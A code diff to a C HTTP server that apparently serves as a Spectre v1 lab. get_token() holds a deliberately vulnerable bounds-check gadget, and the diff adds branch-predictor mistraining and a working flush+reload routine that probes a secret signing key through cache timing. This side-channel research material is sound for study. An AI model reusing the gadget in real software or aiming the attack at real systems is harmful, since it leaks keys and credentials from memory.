@@ -9,6 +9,7 @@
 #include <sys/time.h>
 #include <stdint.h>
 #include <x86intrin.h>
+#include <sys/mman.h>
 
 #include "victim.h"
 
@@ -18,7 +19,7 @@
 #define KEY_SIZE 8
 #define USERNAME_MAX 16
 #define PASSWORD_MAX 32
-#define CACHE_STRIDE 64
+#define CACHE_STRIDE 4096
 
 int attack_id = ((unsigned long)&layout.secret_key[0]-(unsigned long)&layout.role_binding.roles[0]);
 
@@ -34,10 +35,28 @@ struct SharedMemory layout = {
 
 
 int main(){
+
+    size_t probe_size = 2 * 1024 * 1024; 
+    
+    layout.role_usage = mmap(NULL, probe_size, PROT_READ | PROT_WRITE, 
+                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
+
+    if (layout.role_usage == MAP_FAILED) {
+        perror("mmap failed - use sudo sysctl -w vm.nr_hugepages=256");
+        exit(1);
+    }
+    memset(layout.role_usage, 1, probe_size);
+
+    users = load_users();
+
+    // check for spectrev1 signal presence
+    //spectre_flush_reload();
+    //exit(1);
+
     // tests attack id and returns set association
     calc_set();
     // forces role_usage array to exist in RAM
-    memset(layout.role_usage, 1, sizeof(layout.role_usage));
+    
     // mem address and attack id info
     printf("memory address of first byte signing key: %p\n", &layout.secret_key[0]);
     printf("memory address of start of roles array: %p\n", (void *)&layout.role_binding.roles[0]);
@@ -47,7 +66,7 @@ int main(){
     // initialises server and opens server for connections
     struct Server server = server__constructor(AF_INET, 0, SOCK_STREAM, INADDR_ANY, PORT, 10, launch);
     // initialises user registry with one user
-    users = load_users();
+    
     server.launch(&server);
     return 0;
 }
@@ -150,15 +169,20 @@ void launch(struct Server *server)
             if (status > 0){
                 // trains bp for Spectre_v1
                 char *training_up = "none"; 
-                for (int j = 40; j >= 0; j--) {
+                for (int j = 50; j >= 0; j--) {
+                    // flush to train bp
                     _mm_clflush((void*)&layout.role_binding.role_count); 
                     for (volatile int z = 0; z < 100; z++) {} //  (can also mfence)
 
+                    // call function with valid data
                     get_token(training_up, training_up, (j % 5));
                 }
                 
                 // sends result from get_token function
+                _mm_clflush(&layout.role_binding.role_count);
+                _mm_mfence();
                 char *data = get_token(username, password, user_id);
+
                 if (data != NULL){
                     http_response(response, RESPONSE_SIZE, 200, data);
                     write(new_socket, response, strlen(response));
@@ -186,13 +210,9 @@ volatile uint8_t temp;
 char * get_token(char *username, char *password, unsigned int user_id)
 {
     // ===============  SPECTRE VULNERABILITY ===============
-   
-    volatile uint8_t dummy = layout.role_binding.roles[0]; // loads into cache
-    _mm_clflush(&layout.role_binding.role_count);
-    _mm_mfence();
+    //volatile uint8_t dummy = layout.role_binding.roles[0]; // loads into cache
     
     if(user_id < layout.role_binding.role_count){
-        
         temp = layout.role_usage[layout.role_binding.roles[user_id] * CACHE_STRIDE]; // * CACHE_STRIDE ensures each unqiue byte maps to unique cache set
         
     // ======================================================
@@ -202,7 +222,7 @@ char * get_token(char *username, char *password, unsigned int user_id)
         int result = check(username, password);
         _mm_mfence();
         if (result == 1){
-               static char response[128];
+            static char response[128];
    
             // get token
             unsigned char signature[EVP_MAX_MD_SIZE];
@@ -218,7 +238,6 @@ char * get_token(char *username, char *password, unsigned int user_id)
     }
     return NULL;
     //return "wrong username or password\n";
-
 }
 
 // returns 1 if username + password correct
@@ -307,4 +326,66 @@ void http_response(char *response, int response_size, int status_code, char *mes
     );
 }
 
+// runs a flush + reload attack on get_token() and return the total runs where spectre side effectwas detected
+void spectre_flush_reload() {
+    printf("\nChecking if get_token() triggers spectre\n");
 
+    uint8_t target_byte = layout.secret_key[0]; // taregtign 0x23
+    volatile uint8_t *target_probe = &layout.role_usage[target_byte * CACHE_STRIDE]; // address where spectre should write to 
+
+    char *u = "none";
+    char *p = "none";
+    size_t time = 0;
+    int total_successes = 0; //count
+
+    for (int r = 0; r < 100; r++){
+        
+        int hits = 0;
+        unsigned int junk;
+
+        for (int t = 0; t < 1000; t++) {
+            // FLUSH
+            _mm_clflush((void*)target_probe);
+            _mm_mfence();
+
+            // TRAINING BP
+            for (int k = 0; k < 200; k++) {
+                volatile uint8_t warm_up = layout.secret_key[0]; // warm secret so no long fetch needed
+                volatile uint8_t warm_roles = layout.role_binding.roles[0];
+                _mm_clflush(&layout.role_binding.role_count);
+                _mm_mfence();
+                get_token(u, p, 0);
+            }   
+            _mm_lfence(); 
+
+            // ATTACK
+            _mm_clflush(&layout.role_binding.role_count);
+            _mm_mfence();
+            
+            for(volatile int z = 0; z < 100; z++) {}
+
+            get_token(u, p, attack_id);
+            _mm_mfence();
+
+            // RELOAD
+            uint64_t t1 = __rdtscp(&junk);
+            uint8_t temp_read = *target_probe; 
+            uint64_t t2 = __rdtscp(&junk);
+
+            // threshold of 160
+            if (t2-t1 <= 160) {
+                //printf("Hit Time: %lu\n", (t2-t1));
+                time += (size_t)(t2-t1);
+                hits++;
+            }
+        }
+    
+        if (hits > 50) {
+             //printf("Success (Hits: %d / 1000)\n", hits);
+             total_successes++;
+        }
+    }   
+    float avg = (float)time / (1000 * 100);
+
+    printf("\nTotal Success Runs %d / 100\n AVG HIT TIME: %0.1f\n", total_successes, avg);
+}
